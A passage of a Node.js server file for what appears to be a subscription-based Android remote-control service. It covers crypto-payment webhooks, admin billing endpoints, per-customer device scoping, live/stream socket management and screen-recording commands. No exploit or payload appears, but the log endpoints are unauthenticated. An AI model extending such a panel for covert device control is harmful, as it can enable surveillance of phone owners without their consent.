            return res.status(404).json({ error: 'user_not_found' });
        }

        // Idempotency: if we've already credited this paymentId, just ack.
        if (paymentId && (user.paymentHistory || []).some(p => p.paymentId === String(paymentId) && p.status === status)) {
            log('PAYMENT', `Duplicate IPN for payment ${paymentId} — already credited`);
            return res.json({ ok: true, duplicate: true });
        }

        const now      = new Date();
        const extend   = paymentSettings.extendDays;
        const baseline = user.paidUntil && user.paidUntil > now ? user.paidUntil : now;
        user.paidUntil = new Date(baseline.getTime() + extend * 24 * 60 * 60 * 1000);
        user.tier      = 'paid';
        user.paymentHistory = (user.paymentHistory || []).slice(-49);
        user.paymentHistory.push({
            paymentId:    String(paymentId || ''),
            invoiceId:    String(invoiceId || ''),
            status,
            amountUsd,
            payAmount,
            payCurrency,
            receivedAt:   now,
            extendedDays: extend,
        });
        await user.save();
        log('PAYMENT', `Credited ${extend} day(s) to ${user.email} — paidUntil=${user.paidUntil.toISOString()}`);

        return res.json({ ok: true, paidUntil: user.paidUntil });
    } catch (e) {
        log('PAYMENT', `Webhook error: ${e.message}`, 'error');
        return res.status(500).json({ error: e.message });
    }
});

// GET /api/admin/payment — returns webhook URL + secret status (admin only).
app.get('/api/admin/payment', requireAdmin, (req, res) => {
    const host = req.get('x-forwarded-host') || req.get('host') || `localhost:${HTTP_PORT}`;
    const proto = req.get('x-forwarded-proto') || (req.secure ? 'https' : 'http');
    res.json({
        success: true,
        webhookUrl:    `${proto}://${host}/api/payment/webhook/nowpayments`,
        ipnSecretSet:  !!paymentSettings.ipnSecret,
        ipnSecretMask: paymentSettings.ipnSecret
            ? '***' + paymentSettings.ipnSecret.slice(-6)
            : '',
        paymentUrl:    paymentSettings.paymentUrl,
        priceUsd:      paymentSettings.priceUsd,
        extendDays:    paymentSettings.extendDays,
    });
});

// POST /api/admin/payment — set IPN secret / payment URL (admin only).
app.post('/api/admin/payment', requireAdmin, (req, res) => {
    const { ipnSecret, paymentUrl, priceUsd, extendDays } = req.body || {};
    if (typeof ipnSecret === 'string' && !ipnSecret.startsWith('***')) {
        paymentSettings.ipnSecret = ipnSecret.trim();
    }
    if (typeof paymentUrl === 'string' && paymentUrl.trim()) {
        paymentSettings.paymentUrl = paymentUrl.trim();
    }
    if (Number.isFinite(Number(priceUsd))   && Number(priceUsd) > 0)   paymentSettings.priceUsd   = Number(priceUsd);
    if (Number.isFinite(Number(extendDays)) && Number(extendDays) > 0) paymentSettings.extendDays = Number(extendDays);
    log('PAYMENT', `Admin updated payment settings (ipnSecretSet=${!!paymentSettings.ipnSecret})`);
    res.json({ success: true });
});

// POST /api/admin/users/:id/grant-month — admin manually credits 30 days.
app.post('/api/admin/users/:id/grant-month', requireAdmin, async (req, res) => {
    try {
        const days = Math.max(1, Math.min(3650, Number(req.body?.days || paymentSettings.extendDays)));
        const user = await User.findById(req.params.id);
        if (!user) return res.status(404).json({ success: false, error: 'User not found' });
        const now      = new Date();
        const baseline = user.paidUntil && user.paidUntil > now ? user.paidUntil : now;
        user.paidUntil = new Date(baseline.getTime() + days * 24 * 60 * 60 * 1000);
        user.tier      = 'paid';
        user.paymentHistory = (user.paymentHistory || []).slice(-49);
        user.paymentHistory.push({
            paymentId:    `manual-${Date.now()}`,
            invoiceId:    '',
            status:       'manual_grant',
            amountUsd:    0,
            receivedAt:   now,
            extendedDays: days,
        });
        await user.save();
        log('PAYMENT', `Admin granted ${days}d to ${user.email} — paidUntil=${user.paidUntil.toISOString()}`);
        res.json({ success: true, paidUntil: user.paidUntil });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// POST /api/admin/users/:id/revoke-paid — admin clears paid window.
app.post('/api/admin/users/:id/revoke-paid', requireAdmin, async (req, res) => {
    try {
        const user = await User.findById(req.params.id);
        if (!user) return res.status(404).json({ success: false, error: 'User not found' });
        user.paidUntil = null;
        user.tier      = 'free';
        await user.save();
        log('PAYMENT', `Admin revoked paid status for ${user.email}`);
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Recordings are stored ONLY on the Android device.
// Use list_screen_recordings / get_screen_recording / delete_screen_recording commands via /api/commands.

// ── Runtime Logs API ──────────────────────────────────────────────────────────
app.get('/api/logs', (req, res) => {
    res.json({ success: true, logs: logBuffer });
});

app.get('/api/logs/stream', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();

    res.write(`data: ${JSON.stringify({ ts: Date.now(), source: 'system', level: 'info', message: `[stream connected] sending ${logBuffer.length} buffered entries` })}\n\n`);
    logBuffer.forEach(entry => res.write(`data: ${JSON.stringify(entry)}\n\n`));

    logClients.add(res);
    req.on('close', () => logClients.delete(res));
});

app.get('*', (req, res) => {
    const fp = path.join(__dirname, 'public', req.path);
    if (fs.existsSync(fp) && fs.statSync(fp).isFile()) res.sendFile(fp);
    else {
        const index = path.join(__dirname, 'public', 'index.html');
        if (fs.existsSync(index)) res.sendFile(index);
        else res.status(404).send('Dashboard not built. Run: npm run build');
    }
});

// ============================================
// DB HELPERS
// ============================================
async function getDeviceList(accessIdFilter) {
    // Helper: override isOnline to match the live TCP socket map so the
    // dashboard never shows a device as online when commands would fail.
    const reconcile = (devices) => devices.map(d => {
        const obj = d.toObject ? d.toObject() : { ...d };
        obj.isOnline = deviceToTcp.has(obj.deviceId);
        return obj;
    });
    // Apply per-client access-id scoping. Admins call this without a filter
    // and get every device. Users call this with their own accessId and only
    // see devices that registered with the same id.
    const scope = (devices) => {
        if (!accessIdFilter) return devices;
        return devices.filter(d => (d.accessId || '') === accessIdFilter);
    };

    // Priority: MongoDB → Redis → in-memory
    try {
        const dbDevices = await Device.find().sort({ lastSeen: -1 });
        if (dbDevices && dbDevices.length > 0) return scope(reconcile(dbDevices));
    } catch (_) {}
    // Fallback: Redis
    const redisDevices = await R.getAllDevices();
    if (redisDevices.length > 0) return scope(reconcile(redisDevices.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen))));
    // Final fallback: in-memory
    return scope(reconcile(Array.from(inMemoryDevices.values())));
}

// Broadcast device:list to every connected dashboard, scoped per recipient.
// Admins always receive the full list; users only see devices matching their
// accessId. Sending one filtered payload per client is a tiny cost compared
// to the round-trip latency improvement of doing it server-side.
async function broadcastDeviceList() {
    if (sseClients.size === 0) return;
    const adminList = await getDeviceList();
    const userListCache = new Map();
    for (const [id, client] of sseClients) {
        let list = adminList;
        if (client.role === 'user') {
            const aid = client.accessId || '';
            if (!aid) { list = []; }
            else if (userListCache.has(aid)) { list = userListCache.get(aid); }
            else {
                list = adminList.filter(d => (d.accessId || '') === aid);
                userListCache.set(aid, list);
            }
        }
        sseSend(id, 'device:list', list);
    }
}

// Broadcast an event to admin SSE clients and to user SSE clients whose
// accessId matches the device's accessId. Pass `accessId=null` to broadcast
// to admins only (or to all if no accessId scoping applies).
function broadcastDashScoped(event, data, accessId) {
    if (sseClients.size === 0) return;
    const payload = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
    for (const [, client] of sseClients) {
        if (client.role === 'user') {
            if (!accessId || (client.accessId || '') !== accessId) continue;
        }
        try { client.res.write(payload); } catch (_) {}
    }
}

// ============================================
// PERIODIC TASKS
// ============================================

// Ping TCP clients (Android devices) — record send time for server-side RTT measurement
setInterval(() => {
    const now = Date.now();
    for (const conn of tcpClients.values()) {
        if (!conn.writable) continue;
        // Only ping the primary channel (it replies with device:pong on the same socket)
        if (!conn.channelType && conn.deviceId) devicePingTime.set(conn.deviceId, now);
        tcpSend(conn, 'device:ping', { timestamp: now });
    }
}, PING_INTERVAL);

// Drop stale TCP connections — handle primary and secondary channels separately
setInterval(async () => {
    const now = Date.now();
    for (const [id, conn] of tcpClients) {
        if (!conn.deviceId) continue;
        if (now - conn.lastPong > PONG_TIMEOUT) {
            log('TCP', `Device ${conn.deviceId} timed out, dropping (channel: ${conn.channelType || 'primary'})`);
            tcpClients.delete(id);
            conn.destroy();

            if (conn.channelType === 'stream') {
                // Only remove stream ref if this IS the current active stream socket
                if (deviceToStreamTcp.get(conn.deviceId) === id) deviceToStreamTcp.delete(conn.deviceId);
            } else if (conn.channelType === 'live') {
                // Only remove live ref if this IS the current active live socket
                if (deviceToLiveTcp.get(conn.deviceId) === id) deviceToLiveTcp.delete(conn.deviceId);
            } else {
                // Primary channel — only mark offline if no newer primary has already taken over.
                if (deviceToTcp.get(conn.deviceId) !== id) {
                    continue; // Ghost socket from previous reconnect — discard silently
                }
                deviceToTcp.delete(conn.deviceId);
                try { await Device.findOneAndUpdate({ deviceId: conn.deviceId }, { isOnline: false, lastSeen: new Date() }); } catch (e) {}
                {
                    const rec = inMemoryDevices.get(conn.deviceId);
                    const aid = (rec && rec.accessId) || '';
                    broadcastDashScoped('device:disconnected', { deviceId: conn.deviceId, accessId: aid, timestamp: new Date() }, aid || null);
                }
                broadcastDeviceList();
            }
        }
    }
}, 10000);

// Mark DB devices offline if not seen in 60s
setInterval(async () => {
    try {
        const cutoff = new Date(Date.now() - 60000);
        await Device.updateMany({ lastSeen: { $lt: cutoff }, isOnline: true }, { isOnline: false });
    } catch (e) {}
}, 30000);

// ============================================
// START
// ============================================

// Kill any stale process holding our ports before binding
const { execSync } = require('child_process');
try { execSync(`fuser -k ${HTTP_PORT}/tcp 2>/dev/null`); } catch (_) {}
try { execSync(`fuser -k ${TCP_PORT}/tcp  2>/dev/null`); } catch (_) {}

server.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
        log('HTTP', `Port ${HTTP_PORT} still in use — retrying in 2s…`);
        setTimeout(() => {
            try { execSync(`fuser -k ${HTTP_PORT}/tcp 2>/dev/null`); } catch (_) {}
            server.listen(HTTP_PORT);
        }, 2000);
    } else {
        throw err;
    }
});

// Print a compact status banner so commercial deployments (Heroku/Zeabur/etc.)
// can immediately see in their boot logs whether the build worker is wired up.
// The previous symptom of "worker never comes online on Heroku/Zeabur" is
// almost always (a) the BUILD_WORKER_API_KEY env var is not set on the
// backend's deployment, or (b) the worker can't reach the public URL — both
// of which this banner + GET /api/build/worker/health make obvious.
function _logBuildWorkerStatus() {
    if (buildWorkerSettings.apiKey) {
        log('BUILD', `Worker API key: configured (length=${buildWorkerSettings.apiKey.length}). Workers may now poll /api/build/worker/poll.`);
    } else {
        log('BUILD', 'Worker API key: NOT configured. The dashboard will show "Worker offline" forever until you either:', 'warn');
        log('BUILD', '  • set BUILD_WORKER_API_KEY (or BUILD_API_KEY) as an env var on this backend (recommended for Heroku/Zeabur/Render/Fly/Railway), OR', 'warn');
        log('BUILD', '  • log in as admin and set the key from Settings → Build worker key (note: this is in-memory and is wiped on every restart).', 'warn');
    }
    log('BUILD', `Public health check: GET /api/build/worker/health  (no auth, safe to curl)`);
}

// Initialize Redis first, then start HTTP server
R.init().then(() => {
    server.listen(HTTP_PORT, () => {
        log('HTTP', `Server running on port ${HTTP_PORT}`);
        log('HTTP', `Dashboard → http://localhost:${HTTP_PORT}  (SSE: GET /api/events)`);
        log('TCP',  `Android devices → localhost:${TCP_PORT}`);
        if (!process.env.REDIS_URL) {
            log('REDIS', 'REDIS_URL not configured — skipping Redis (in-memory only)', 'warn');
        }
        _logBuildWorkerStatus();
    });
}).catch((err) => {
    log('REDIS', `Init error: ${err.message} — starting without Redis`, 'warn');
    server.listen(HTTP_PORT, () => {
        log('HTTP', `Server running on port ${HTTP_PORT}`);
        log('HTTP', `Dashboard → http://localhost:${HTTP_PORT}  (SSE: GET /api/events)`);
        log('TCP',  `Android devices → localhost:${TCP_PORT}`);
        _logBuildWorkerStatus();
    });
});

async function gracefulShutdown(signal) {
    log('SHUTDOWN', `${signal} received — closing…`);
    try { await R.quit(); } catch (_) {}
    try { await mongoose.connection.close(); } catch (_) {}
    process.exit(0);
}

process.on('SIGINT',  () => gracefulShutdown('SIGINT'));
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));

module.exports = { app, server };
